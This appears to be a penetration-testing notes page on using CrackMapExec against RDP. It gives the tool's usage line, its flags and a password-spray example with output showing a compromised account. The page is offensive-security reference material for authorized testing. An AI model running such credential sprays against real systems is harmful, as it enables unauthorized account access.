---
title : "RDP"
# pre : ' '
description : "Own stuff using RDP."
date : 2022-10-16T20:04:43+02:00
# hidden : true
# draft : true
weight : 40
# tags : ['']
---

---

## Installation

Install [CrackMapExec]({{< ref "../crackmapexec" >}})

## Usage

```plain
cme rdp [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--no-bruteforce] [--continue-on-success] [--use-kcache] [--log LOG] [--aesKey AESKEY [AESKEY ...]]
               [--kdcHost KDCHOST] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}] [--server-host HOST]
               [--server-port PORT] [--connectback-host CHOST] [-H HASH [HASH ...]] [--port PORT] [--rdp-timeout RDP_TIMEOUT] [--nla-screenshot] [-d DOMAIN | --local-auth] [--screenshot] [--screentime SCREENTIME]
               [--res RES]
               target [target ...]
```

## Flags

```plain
positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

options:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication
  --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2
  --continue-on-success
                        continues authentication attempts even after successes
  --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
  --log LOG             Export result into a custom file
  --aesKey AESKEY [AESKEY ...]
                        AES key to use for Kerberos Authentication (128 or 256 bits)
  --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  --gfail-limit LIMIT   max number of global failed login attempts
  --ufail-limit LIMIT   max number of failed login attempts per username
  --fail-limit LIMIT    max number of failed login attempts per host
  -M MODULE, --module MODULE
                        module to use
  -o MODULE_OPTION [MODULE_OPTION ...]
                        module options
  -L, --list-modules    list available modules
  --options             display module options
  --server {http,https}
                        use the selected server (default: https)
  --server-host HOST    IP to bind the server to (default: 0.0.0.0)
  --server-port PORT    start the server on the specified port
  --connectback-host CHOST
                        IP for the remote system to connect back to (default: same as server-host)
  -H HASH [HASH ...], --hash HASH [HASH ...]
                        NTLM hash(es) or file(s) containing NTLM hashes
  --port PORT           Custom RDP port
  --rdp-timeout RDP_TIMEOUT
                        RDP timeout on socket connection
  --nla-screenshot      Screenshot RDP login prompt if NLA is disabled
  -d DOMAIN             domain to authenticate to
  --local-auth          authenticate locally to each target

Screenshot:
  Remote Desktop Screenshot

  --screenshot          Screenshot RDP if connection success
  --screentime SCREENTIME
                        Time to wait for desktop image
  --res RES             Resolution in "WIDTHxHEIGHT" format. Default: "1024x768"
```

## Examples

**NOTE:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Usefull for spraying a single password against a large user list.

### Password Spray

```plain
cme rdp 10.10.10.0/24 -u user -p password
```

```plain
$ crackmapexec rdp 10.10.10.0/24 -u ron -p Welkom1234
RDP         10.10.10.10 3389   FILE01           [*] Windows 10 or Windows Server 2016 Build 17763 (name:FILE01) (domain:offsec.nl)
RDP         10.10.10.10 3389   FILE01           [+] offsec.nl\john:Welkom1234 (Pwn3d!)
RDP         10.10.10.20 3389   FILE02           [*] Windows 10 or Windows Server 2016 Build 17763 (name:FILE02) (domain:offsec.nl)
RDP         10.10.10.20 3389   FILE02           [-] offsec.nl\john:Welkom1234 
```

## URL List

- [Github.com - CrackMapExec](https://github.com/mpgn/CrackMapExec)
